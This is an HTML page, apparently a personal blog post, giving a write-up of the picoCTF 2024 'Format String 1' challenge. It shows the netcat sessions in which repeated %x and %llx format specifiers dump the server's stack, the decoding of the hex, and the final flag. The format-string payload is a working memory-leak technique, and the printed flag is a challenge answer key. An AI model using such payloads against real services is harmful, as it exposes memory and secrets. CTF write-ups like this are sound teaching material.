@@ -1,0 +1,154 @@
+<!doctype html>
+<html lang="en" data-scheme="river" data-schemes="river">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>picoCTF: Format String 1 · river</title>
+    <meta name="description" content="Easy format string vulnerability">
+    <meta name="author" content="river">
+    <link rel="canonical" href="https://rivers.sh/posts/picoctf-formatstring1/">
+    <meta property="og:site_name" content="river">
+    <meta property="og:title" content="picoCTF: Format String 1">
+    <meta property="og:description" content="Easy format string vulnerability">
+    <meta property="og:url" content="https://rivers.sh/posts/picoctf-formatstring1/">
+    <meta property="og:type" content="article">
+    <meta property="og:image" content="https://rivers.sh/images/og.jpg">
+    <meta name="twitter:card" content="summary">
+    <link rel="icon" href="/images/favicon.svg" type="image/svg+xml">
+    <link rel="alternate" type="application/atom+xml" title="river" href="/atom.xml">
+    <link rel="preload" href="/fonts/MesloLGS-Regular.ttf" as="font" type="font/ttf" crossorigin>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/syntax.css">
+    <script>
+    // Runs before first paint: restore the visitor's colour scheme and pick the
+    // background art, so neither flashes in after load.
+    (function () {
+      var d = document.documentElement;
+      try {
+        var s = localStorage.getItem("scheme");
+        if (s && d.getAttribute("data-schemes").split(" ").indexOf(s) !== -1) d.setAttribute("data-scheme", s);
+      } catch (e) {}
+      var art = ["/images/art/art1.jpg"];
+      if (!art.length) return;
+      var i = Math.floor(Math.random() * art.length);
+      try {
+        // don't show the same art twice in a row
+        var last = parseInt(localStorage.getItem("art-last"), 10);
+        if (art.length > 1 && i === last) i = (i + 1 + Math.floor(Math.random() * (art.length - 1))) % art.length;
+        localStorage.setItem("art-last", i);
+      } catch (e) {}
+      var a = typeof art[i] === "string" ? { src: art[i] } : art[i];
+      d.style.setProperty("--art", 'url("' + a.src + '")');
+      d.style.setProperty("--art-pos", a.position || "right bottom");
+      d.setAttribute("data-art", "");
+    })();
+    </script>
+</head>
+<body class="is-post">
+    <a class="skip-link" href="#main">skip to content</a>
+    <div class="page">
+        <header class="site-header">
+    <a class="site-title" href="/">river</a>
+    <nav class="site-nav" aria-label="site">
+        <ul><li><a href="/">home</a></li><li><a href="/blog/">blog</a></li><li><a href="/categories/">categories</a></li><li><a href="/tags/">tags</a></li><li><a href="/search/">search</a></li></ul>
+    </nav>
+</header>
+
+        <main id="main">
+<article class="post h-entry">
+    <header class="post-header">
+        <h1 class="post-title p-name">picoCTF: Format String 1</h1>
+        <!-- no whitespace between items: the "|" separators supply the spacing -->
+        <div class="post-meta"><time class="dt-published" datetime="2024-08-27">Aug 27, 2024</time><span>1 min read</span><span class="post-cats"><a href="/categories/ctf/">CTF</a> › <a href="/categories/ctf/picoctf2024/">picoCTF2024</a> › <a href="/categories/ctf/picoctf2024/medium/">Medium</a></span><span class="post-tags"><a class="p-category" href="/tags/format-string/">#Format String</a> <a class="p-category" href="/tags/binary-exploitation/">#Binary Exploitation</a></span></div>
+        <p class="post-description p-summary">Easy format string vulnerability</p>
+    </header>
+
+    
+    <details class="toc toc-inline">
+        <summary>contents</summary>
+        <nav aria-label="contents"><ol><li class="toc-h2"><a href="#challenge-info">Challenge Info</a></li><li class="toc-h2"><a href="#attempts">Attempts</a></li><li class="toc-h2"><a href="#solution">Solution</a></li></ol></nav>
+    </details>
+    
+
+    <div class="prose e-content" tabindex="-1">
+
+<h2 id="challenge-info"><a href="#challenge-info" class="anchor">#</a>Challenge Info</h2>
+<p>description: <code>Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!</code></p>
+<p>Downloads the binary <a href="https://artifacts.picoctf.net/c_mimas/82/format-string-1" target="_blank" rel="noopener">here</a>.</p>
+<p>Downloads the source <a href="https://artifacts.picoctf.net/c_mimas/82/format-string-1.c" target="_blank" rel="noopener">here</a>.</p>
+<p>Connect with the challenge instance here:<br />
+<code>nc mimas.picoctf.net &lt;port&gt;</code></p>
+<p>author: Connor Chang</p>
+<p><img src="/images/formatstring-1/formatstring1.png" alt="format string 1" /></p>
+<h2 id="attempts"><a href="#attempts" class="anchor">#</a>Attempts</h2>
+<p>Upon connecting to the netcat listener, we're prompted: <code>Give me your order and I'll read it back to you:</code></p>
+<p>Because of the name of the challenge; "<strong>Format String</strong> 1", we already get a pretty big hint. Just from experience, I know that <code>%x</code> can be used in format string vulnerabilities to either dump or navigate memory stacks. Naturally, this is the route I took.</p>
+<pre><code>~ &gt; nc mimas.picoctf.net 63183                               INT 18s
+Give me your order and I&#39;ll read it back to you:
+%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,
+Here&#39;s your order: 402118,0,6377ea00,0,a64880,a347834,b4da5590,6356fe60,637944d0,1,b4da5660,0,0,6f636970,6d316e34,33317937,3431665f,64303935,7,637968d8,7,74307250,6c797453,9,637a7de9,63578098,637944d0,0,b4da5670,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,454d4100,6e656c6c,4c564c48,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+Bye!</code></pre>
+<p>After pasting this into <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">Cyberchef</a> with "From Hex" selected, I started to notice what might be a flag.</p>
+<p><img src="/images/formatstring-1/possibleflag.png" alt="possible flag" /></p>
+<h2 id="solution"><a href="#solution" class="anchor">#</a>Solution</h2>
+<p>After inspecting the initial output, I decided to modify my format string to use <code>%llx</code> instead of <code>%x</code>. The <code>ll</code> modifier stands for "long long," which in C is a data type representing a 64-bit integer. By using <code>%llx</code>, I ensured that each stack read would capture a full 64-bit value, meaning 16 hexadecimal digits would be printed instead of just 8. This is important because the flag or other useful data might be stored in a location that requires reading all 16 bytes (instead of 8) to be fully captured.</p>
+<p>After using this adjustment, with commas <code>,</code> to clearly separate each stack, I got a different result:</p>
+<pre><code>~ &gt; nc mimas.picoctf.net 63183                            INT 1m 53s
+Give me your order and I&#39;ll read it back to you:
+%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,
+Here&#39;s your order: 402118,0,7aaeacfeba00,0,1c1f880,a347834,7ffd67ec6cc0,7aaeacddce60,7aaead0014d0,1,7ffd67ec6d90,0,0,7b4654436f636970,355f31346d316e34,3478345f33317937,35365f673431665f,7d313464303935,7,7aaead0038d8,2300000007,206e693374307250,a336c797453,9,7aaead014de9,7aaeacde5098,7aaead0014d0,0,7ffd67ec6da0,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,
+Bye!</code></pre>
+<p>I decided to put these hex values through Cyberchef again, and saw what's definitely an encoded flag:</p>
+<p><img src="/images/formatstring-1/possibleflag2.png" alt="possible flag" /></p>
+<p>After removing the null values, I was left with this:</p>
+<p><img src="/images/formatstring-1/jumbledflag.png" alt="jumbled flag" /></p>
+<p>From here, the challenge is mostly decoding.</p>
+<p>flag: <code>picoCTF{4n1m41_57y13_4x4_f14g_65590d41}</code></p>
+<hr />
+
+    </div>
+
+    <nav class="post-nav" aria-label="more posts">
+        <a class="prev" href="/posts/picoctf-vne/" rel="prev"><span class="post-nav-label">‹ older</span>picoCTF: VNE</a>
+        <a class="next" href="/posts/picoctf-formatstring2/" rel="next"><span class="post-nav-label">newer ›</span>picoCTF: Format String 2</a>
+    </nav>
+</article>
+
+<aside class="post-aside" aria-label="on this page">
+    <ul class="aside-actions">
+        <li><a href="/posts/picoctf-vne/" title="older: picoCTF: VNE" aria-label="older post">‹</a></li>
+        <li><a href="/posts/picoctf-formatstring2/" title="newer: picoCTF: Format String 2" aria-label="newer post">›</a></li>
+        <li><a href="#top" class="to-top" title="back to top" aria-label="back to top">↑</a></li>
+    </ul>
+    <nav class="toc toc-side" aria-label="contents"><ol><li class="toc-h2"><a href="#challenge-info">Challenge Info</a></li><li class="toc-h2"><a href="#attempts">Attempts</a></li><li class="toc-h2"><a href="#solution">Solution</a></li></ol></nav>
+</aside>
+
+        </main>
+        <footer class="site-footer">
+    <span class="footer-left">
+        <span>&copy; 2024–2026 river</span>
+        <button type="button" class="contact-button" aria-controls="toast" data-label="email" data-value="Y29udGFjdEByaXZlcnMuc2g=">email</button><button type="button" class="contact-button" aria-controls="toast" data-label="signal" data-value="cml2LjEzMzc=">signal</button><button type="button" class="contact-button" aria-controls="toast" data-label="pgp" data-value="QzREQiAxMjc3IDJCQjUgNDY1NyBFQjM3IDQxODQgOEE3QSAwOTQyIDFEQjQgODE4Mg==">pgp</button>
+    </span>
+    <span class="footer-links">
+        <a href="/atom.xml">atom</a>
+        <button type="button" class="scheme-toggle" title="switch colour scheme">scheme: <span class="scheme-name">river</span></button>
+    </span>
+    <div class="toast" id="toast" role="status" aria-live="polite" hidden></div>
+</footer>
+
+    </div>
+    <script src="/js/main.js" defer></script>
+    
+    
+    <script>
+    // oneko chases the cursor, so skip it on touch screens
+    (function () {
+      if (!matchMedia("(hover: hover) and (pointer: fine)").matches) return;
+      var s = document.createElement("script");
+      s.src = "/js/oneko.js";
+      document.body.appendChild(s);
+    })();
+    </script>
+    
+</body>
+</html>
